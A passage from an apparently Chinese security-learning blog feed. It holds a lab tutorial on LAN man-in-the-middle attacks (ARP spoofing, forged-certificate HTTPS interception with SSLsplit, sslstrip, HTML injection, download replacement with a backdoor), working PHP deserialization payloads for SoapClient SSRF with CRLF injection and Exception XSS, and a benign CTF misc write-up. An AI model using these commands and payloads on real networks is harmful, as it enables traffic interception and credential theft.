title="抓取局域网里的图片"></a>抓取局域网里的图片</h2><p>kali：192.168.0.112</p><p>靶机：192.168.0.103</p><p>没进行arp欺骗之前，我们看下arp表</p><img src="/2020/03/25/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/TIM截图20200325214515.png" style="zoom:80%;"><p>让后设置ip转发,默认为0</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure><p>如果不设置为1，进行下面的操作相当于断网攻击</p><p>然后我们进行欺骗</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i wlan0 -t 192.168.0.103 -r 192.168.0.1</span><br></pre></td></tr></table></figure><p>此时我们再看下arp表，发现mac地址已经发生改变成kali的mac地址</p><img src="/2020/03/25/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/TIM截图20200325214839.png" style="zoom:80%;"><p>可以看到这里已经抓到图片，感谢大佬的博客做实验，逃……</p><img src="/2020/03/25/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/TIM截图20200325215406.png" style="zoom:80%;"><p>发现并不是很全，https的都没抓到</p><p>我们用wireshark查看一下流量，设置一下源地址，就能看到截获的流量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip.src==192.168.0.103</span><br></pre></td></tr></table></figure><img src="/2020/03/25/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/TIM截图20200325220555.png" style="zoom:80%;"><h2 id="xerosploit一些操作"><a href="#xerosploit一些操作" class="headerlink" title="xerosploit一些操作"></a>xerosploit一些操作</h2><p>安装结束后直接运行xerosploit</p><img src="/2020/03/25/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/TIM截图20200325221354.png" style="zoom:80%;"><p>输入help获取帮助，直接scan命令扫描，有时候侯可能扫描不到，直接输ip就行</p><p>进入modules之后，help查看所有模块，先试试<strong>注入html</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">style</span>=<span class="string">&quot;font-size:80px;&quot;</span> &gt;</span>hacked by MoonBack!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure><p>随便找了个不是https的站点，可以看到已经注入成功</p><img src="/2020/03/25/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/TIM截图20200325223100.png" style="zoom:80%;"><p><strong>替换所有图片</strong>，随便找的一个站点，没什莫特别的意思</p><img src="/2020/03/25/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/TIM截图20200325223835.png" style="zoom: 67%;"><p><strong>替换下载文件</strong></p><img src="/2020/03/25/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/TIM截图20200325224113.png" style="zoom:80%;"><p>我们试着下载一个exe</p><img src="/2020/03/25/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/TIM截图20200325224431.png" style="zoom:80%;"><p>和kali里生成的后门一样</p><img src="/2020/03/25/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/TIM截图20200325224545.png" style="zoom:80%;"><h2 id="伪造证书抓https"><a href="#伪造证书抓https" class="headerlink" title="伪造证书抓https"></a>伪造证书抓https</h2><p>首先，我们需要一份数字根证书，可以用openssl生成</p><p>先生成证书私钥文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl genrsa -out ca.key 2048</span><br></pre></td></tr></table></figure><p>然后用私钥签名生成证书：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl req -new -x509 -days 1096 -key ca.key -out ca.crt</span><br></pre></td></tr></table></figure><img src="/2020/03/25/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/TIM截图20200325232838.png" style="zoom:80%;"><p>再介绍一下工具<strong>SSLsplit</strong></p><ul><li>透明SSL/TLS中间人攻击工具</li><li>对客户端伪装成服务器，对服务器伪装成客户端</li><li>伪装服务器需要伪装证书</li><li>支持SSL/TLS加密的SMTP POP3 FTP等通信中间人攻击</li></ul><p><strong>参数：</strong></p><ul><li><p>-k 指定私钥key文件，进行欺骗</p></li><li><p>-c 指定Root CA证书文件</p></li><li><p>-D Debug模式，用于输出SSLSplit状态，建议使用时加上</p></li><li><p>-j 指定log目录地址</p></li><li><p>-S 指定-j参数目录下需要记录截断GET、POST请求的子目录地址</p></li><li><p>-l 指定存储的连接信息文件</p></li><li><p>ssl IP 端口 指定ssl需要监听的端口</p></li><li><p>tcp IP 端口 指定tcp需要监听的端口</p></li></ul><p>打开ip_forward功能</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure><p>进行端口转发，即将本机443等端口转发到SSLsplit监听的端口，这里是8080和8443</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -F</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 995 -j REDIRECT --to-ports 8443</span><br></pre></td></tr></table></figure><p>查看一下设置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -L</span><br></pre></td></tr></table></figure><img src="/2020/03/25/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/TIM截图20200325233821.png" style="zoom:80%;"><p>开启arp欺骗</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i wlan0 -t 192.168.0.103 -r 192.168.0.1</span><br></pre></td></tr></table></figure><p>SSLsplit监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sslsplit -D -l connect.log -j /root/Desktop/d -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080</span><br></pre></td></tr></table></figure><p>此时打开百度，发现有这种提醒，如果忽略危害直接打开，我们的账号等信息就会被窃取</p><p>当然，如果通过特殊途径把证书装到了受害者的设备上，就不会有提醒，所有的信息也会被解密</p><img src="/2020/03/25/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/TIM截图20200325234941.png" style="zoom:80%;"><p>这种效果不太好，很卡，而且图片显示不出来，也不知道为啥</p><img src="/2020/03/25/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/TIM截图20200326001603.png" style="zoom:80%;"><p>随便输一个账号，看到里面有信息</p><img src="/2020/03/25/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/TIM截图20200326001511.png" style="zoom:80%;"><p>虽然效果不算理想，但也不失为一种方式，大佬的解释感觉很好</p><img src="/2020/03/25/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/TIM截图20200326001857.png" style="zoom:80%;"><h2 id="https-降级攻击"><a href="#https-降级攻击" class="headerlink" title="https 降级攻击"></a>https 降级攻击</h2><p>攻击者拦截用户流量后，欺骗用户与攻击者进行 http 通信，攻击者与服务器保持正常通信 （http 或 https），从而获取用户信息。</p><p>SSLstrip工具主要利用了上面的原理</p><p>github地址：<a href="https://github.com/moxie0/sslstrip">https://github.com/moxie0/sslstrip</a></p><p>用iptables把80端口的流量转发到sslstrip监听的8080端口上</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080</span><br></pre></td></tr></table></figure><p>然后SSlstrip监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sslstrip -l 8080</span><br></pre></td></tr></table></figure><p>开启arp欺骗</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i wlan0 -t 192.168.0.103 -r 192.168.0.1</span><br></pre></td></tr></table></figure><p>ip转发</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure><p>通常情况下我们访问百度的时侯都会强制转换成https，但现在我们访问都是http了，https的无法打开，所以说这个也有一定的局限性，以后看看还有其他方法没</p><img src="/2020/03/25/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/TIM截图20200326004214.png" style="zoom:80%;"><p>参考：</p><p><a href="https://blog.csdn.net/qq_42025840/article/details/81604497">https://blog.csdn.net/qq_42025840/article/details/81604497</a></p><p><a href="https://www.freebuf.com/sectool/118574.html">https://www.freebuf.com/sectool/118574.html</a></p><p><a href="https://blog.csdn.net/ysynhtt/article/details/39996933">https://blog.csdn.net/ysynhtt/article/details/39996933</a></p><p><a href="https://www.freebuf.com/sectool/48016.html">https://www.freebuf.com/sectool/48016.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 折腾 </tag>
            
            <tag> 中间人攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP反序列化之原生类</title>
      <link href="2020/03/22/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bphp%E5%8E%9F%E7%94%9F%E7%B1%BB/"/>
      <url>2020/03/22/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bphp%E5%8E%9F%E7%94%9F%E7%B1%BB/</url>
      
        <content type="html"><![CDATA[<p>本篇博客主要介绍了php原生类反序列化的相关内容！</p><a id="more"></a><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>先回顾一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">当对象被创建的时候调用：__construct()</span><br><span class="line">当对象被销毁的时候调用：__destruct()</span><br><span class="line">当对象被当作一个字符串使用时候调用(不仅仅是echo的时候,比如file_exists()判断也会触发)：__toString()</span><br><span class="line">序列化对象之前就调用此方法(其返回需要是一个数组)：__sleep()</span><br><span class="line">反序列化恢复对象之前就调用此方法：__wakeup()</span><br><span class="line">当调用对象中不存在的方法会自动调用此方法：__call()</span><br></pre></td></tr></table></figure><p>我们可以用这个脚本看一下php内置类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">$classes = get_declared_classes();</span><br><span class="line"><span class="keyword">foreach</span> ($classes <span class="keyword">as</span> $class) &#123;</span><br><span class="line">    $methods = get_class_methods($class);</span><br><span class="line">    <span class="keyword">foreach</span> ($methods <span class="keyword">as</span> $method) &#123;</span><br><span class="line">        <span class="keyword">if</span> (in_array($method, <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;__destruct&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__toString&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__wakeup&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__call&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__callStatic&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__get&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__isset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__unset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__invoke&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set_state&#x27;</span></span><br><span class="line">        ))) &#123;</span><br><span class="line">            <span class="keyword">print</span> $class . <span class="string">&#x27;::&#x27;</span> . $method . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>有些类不一定能够进行反序列化，php中使用了<code>zend_class_unserialize_deny</code>来禁止一些类的反序列化</p><p>常用的有下面这些</p><h2 id="SoapClient"><a href="#SoapClient" class="headerlink" title="SoapClient"></a>SoapClient</h2><p>从php手册我们可以看到有这麽多方法</p><img src="/2020/03/22/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bphp%E5%8E%9F%E7%94%9F%E7%B1%BB/TIM截图20200322222329.png" style="zoom:80%;"><p>soapclient有两种工作模式，wsdl和非wsdl模式，WSDL 用来描述如何访问具体的接口，soap协议的具体格式可以参考这篇文章，soap采用http或者https协议发送数据，并且在http header头中通过soap action来标示自己是一个soap请求</p><p><a href="https://www.cnblogs.com/JeffreySun/archive/2009/12/14/1623766.html">https://www.cnblogs.com/JeffreySun/archive/2009/12/14/1623766.html</a></p><p>这个也算是目前被挖掘出来最好用的一个内置类，php5、7都存在此类</p><p>当然要保证php开启soap扩展</p><img src="/2020/03/22/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bphp%E5%8E%9F%E7%94%9F%E7%B1%BB/TIM截图20200322223538.png" style="zoom:80%;"><p><strong>SSRF：</strong></p><p>由于<code>__call()</code>方法会在调用没有的方法调用，所以我们构造:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;http://example.com:5555&#x27;</span>, <span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&#x27;http://example.com:5555/aaa&#x27;</span>));</span><br><span class="line">$b = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line">$c = unserialize($b);</span><br><span class="line">$c-&gt;a();</span><br></pre></td></tr></table></figure><img src="/2020/03/22/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bphp%E5%8E%9F%E7%94%9F%E7%B1%BB/TIM截图20200322223715.png" style="zoom:80%;"><p>soap类我们可以自定义<code>User-Agent</code>，http header里有两个重要的参数<code>Content-Type为</code>和<code>Content-Length</code><br>我们可以进行CRLF注入，而<code>User-Agent</code>的http header位置正好在这些之上，所以可以进行覆盖<br>对于<code>Content-Type</code>，如果我们想要利用CRLF发送post请求，那么要求它为<code>application/x-www-form-urlencode</code><br>那么此时就可以利用CRLF，构造如下payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target = <span class="string">&quot;http://example.com:5555/&quot;</span>;</span><br><span class="line">$post_string = <span class="string">&#x27;data=abc&#x27;</span>;</span><br><span class="line">$headers = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93&#x27;</span></span><br><span class="line">);</span><br><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; $target,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;wupco^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.join(<span class="string">&#x27;^^&#x27;</span>,$headers).<span class="string">&#x27;^^Content-Length: &#x27;</span>. (<span class="keyword">string</span>)strlen($post_string).<span class="string">&#x27;^^^^&#x27;</span>.$post_string,<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;hello&#x27;</span>));</span><br><span class="line">$aaa = serialize($b);</span><br><span class="line">$aaa = str_replace(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\n\r&quot;</span>,$aaa);</span><br><span class="line"><span class="keyword">echo</span> urlencode($aaa);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Test</span></span><br><span class="line">$c = unserialize($aaa);</span><br><span class="line">$c-&gt;notexists();</span><br></pre></td></tr></table></figure><img src="/2020/03/22/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bphp%E5%8E%9F%E7%94%9F%E7%B1%BB/TIM截图20200322225147.png" style="zoom:80%;"><h2 id="Error"><a href="#Error" class="headerlink" title="Error"></a>Error</h2><p>只适用于php7版本</p><p><strong>XSS:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>);</span><br><span class="line">$b = serialize($a);</span><br><span class="line"><span class="comment">// echo urlencode($b);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Test</span></span><br><span class="line">$c = urldecode(<span class="string">&#x27;O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A43%3A%22D%3A%5CEnvironment%5CPHP%5CPHPTutorial%5CWWW%5Cpost.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> unserialize($c);</span><br></pre></td></tr></table></figure><h2 id="Exception"><a href="#Exception" class="headerlink" title="Exception"></a>Exception</h2><p>适用于php5、7版本</p><p><strong>XSS:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>);</span><br><span class="line">$b = serialize($a);</span><br><span class="line"><span class="comment">// echo urlencode($b);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Test</span></span><br><span class="line">$c = urldecode(<span class="string">&#x27;O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A43%3A%22D%3A%5CEnvironment%5CPHP%5CPHPTutorial%5CWWW%5Cpost.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> unserialize($c);</span><br></pre></td></tr></table></figure><p>参考：</p><p><a href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html">https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF 2nd writeup</title>
      <link href="2020/03/21/BJDCTF-2rd-writeup/"/>
      <url>2020/03/21/BJDCTF-2rd-writeup/</url>
      
        <content type="html"><![CDATA[<p>本篇博客主要介绍了第二届BJDCTF部分题目的writeup!tcl!</p><a id="more"></a><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="最简单的misc"><a href="#最简单的misc" class="headerlink" title="最简单的misc"></a>最简单的misc</h3><p>下载下来是secret.zip，zip伪加密，搜索标志位<code>14 00 09 00</code>将其替换成<code>14 00 00 00</code></p><img src="/2020/03/21/BJDCTF-2rd-writeup/TIM截图20200321180401.png" style="zoom:80%;"><p>解压得到secret，hex编辑器查看发现是png图片格式确少文件头</p><img src="/2020/03/21/BJDCTF-2rd-writeup/TIM截图20200321180736.png" style="zoom:80%;"><p>常见文件文件头尾：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">JPEG (jpg)文件头：FFD8FF文件尾：FF D9　　　　　　　　　　　　　　　</span><br><span class="line">PNG (png)文件头：89504E47文件尾：AE 42 60 82</span><br><span class="line">GIF (gif)文件头：47494638文件尾：00 3B                                               ZIP Archive (zip)文件头：504B0304文件尾：50 4B</span><br><span class="line">RAR Archive (rar)文件头：52617221</span><br><span class="line">Wave (wav)文件头：57415645</span><br><span class="line">AVI (avi)文件头：41564920</span><br></pre></td></tr></table></figure><p>因此我们补上<code>89 50 4E 47</code></p><img src="/2020/03/21/BJDCTF-2rd-writeup/TIM截图20200321181412.png" style="zoom:80%;"><img src="/2020/03/21/BJDCTF-2rd-writeup/TIM截图20200321181522.png" style="zoom:50%;"><p>16进制转ASCII就得到flag了</p><h3 id="A-Beautiful-Picture"><a href="#A-Beautiful-Picture" class="headerlink" title="A_Beautiful_Picture"></a>A_Beautiful_Picture</h3><p>下载下来是<code>Misc-A_Beautiful_Picture-DreamerJack.png</code></p><p>题目考察的是改高度，直接看分辨率也能看出点猫腻</p><p><img src="/2020/03/21/BJDCTF-2rd-writeup/TIM%E6%88%AA%E5%9B%BE20200321182019.png"></p><p>hxd打开,直接改就能得到flag</p><img src="/2020/03/21/BJDCTF-2rd-writeup/TIM截图20200321182243.png" style="zoom:80%;"><img src="/2020/03/21/BJDCTF-2rd-writeup/TIM截图20200321182509.png" style="zoom:50%;"><h3 id="EasyBaBa"><a href="#EasyBaBa" class="headerlink" title="EasyBaBa"></a>EasyBaBa</h3><p>下载下来ezbb.jpg，foremost分离出<code>00000061.zip</code>，解压得到<code>里面都是出题人.jpg</code></p><p>发现可以用视频播放器播放，在其中找到了4张二维码，分别截屏下来扫下，得到4个16进制字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">6167696E5F6C</span><br><span class="line">6F76655F59</span><br><span class="line">424A447B696D</span><br><span class="line">316E677D</span><br><span class="line">6167696E5F6C6F76655F59424A447B696D316E677D</span><br><span class="line">BJD&#123;imagin_love_Y1ng&#125;</span><br></pre></td></tr></table></figure><h3 id="小姐姐"><a href="#小姐姐" class="headerlink" title="小姐姐"></a>小姐姐</h3><p>这题应该是最简单的，想了半年，我这脑子！</p><p>直接strings命令或者Hxd打开就能找到，应该搜索的，哎！要仔细啊！</p><h3 id="Real-EasyBaBa"><a href="#Real-EasyBaBa" class="headerlink" title="Real_EasyBaBa"></a>Real_EasyBaBa</h3><p>下载下来是<code>ezbb_r.png</code>，formost分离出来<code>00000000.jpg</code></p><p>两图片都一样也能正常显示，但大小不一样，hxd对比一下,发现多了下面内容</p><img src="/2020/03/21/BJDCTF-2rd-writeup/TIM截图20200321222554.png" style="zoom:80%;"><p>单独分析一下，发现有<code>50 4B</code>很明显是压缩包，<code>FF</code>是多余的删掉，加上zip的头<code>50 4B 03 04</code>,结果如下图</p><img src="/2020/03/21/BJDCTF-2rd-writeup/TIM截图20200321222934.png" style="zoom:80%;"><p>解压得到hint，打开都是#,刚开始以为是神么加密呢，仔细一瞅是二维码</p><p>不过好像扫不了，看知乎大佬的做法是将#替换成■，在sublime里虽然大二维码扫不了，但右边的小二维码能扫出来</p><img src="/2020/03/21/BJDCTF-2rd-writeup/TIM截图20200321232911.png" style="zoom:80%;"><p>不用替换也能扫，sublime真好,扫出来是：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">od -vtx1 ./draw.png | head -56 | tail -28</span><br></pre></td></tr></table></figure><p>直接输入命令，发现</p><img src="/2020/03/21/BJDCTF-2rd-writeup/TIM截图20200323233100.png" style="zoom:80%;"><p>看到有好多00 ff，把00替换为空会发现</p><img src="/2020/03/21/BJDCTF-2rd-writeup/TIM截图20200323233517.png" style="zoom:67%;"><p>得到flag:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;572154976&#125;</span><br></pre></td></tr></table></figure><h3 id="圣火昭昭"><a href="#圣火昭昭" class="headerlink" title="圣火昭昭"></a>圣火昭昭</h3><p>下载下来是一张图片，查看详细属性发现有</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">新佛曰：諸壽隸僧壽降吽壽諸壽陀壽摩隸僧缽薩願心壽咤壽囉寂壽闍諸壽哆壽慧壽聞壽色吽愍壽所壽蜜如</span><br></pre></td></tr></table></figure><p>解密网址：<a href="http://hi.pcmoe.net/buddha.html">http://hi.pcmoe.net/buddha.html</a></p><p>解密得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gemlove</span><br></pre></td></tr></table></figure><p>提示开局一张图，flag全靠猜</p><p>outgess解密</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">outguess -r sheng_huo_zhao_zhao.jpg -k gemlove -t 1.txt</span><br></pre></td></tr></table></figure><p>得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;wdnmd_misc_1s_so_Fuck1ng_e@sy&#125;</span><br></pre></td></tr></table></figure><h3 id="TARGZ"><a href="#TARGZ" class="headerlink" 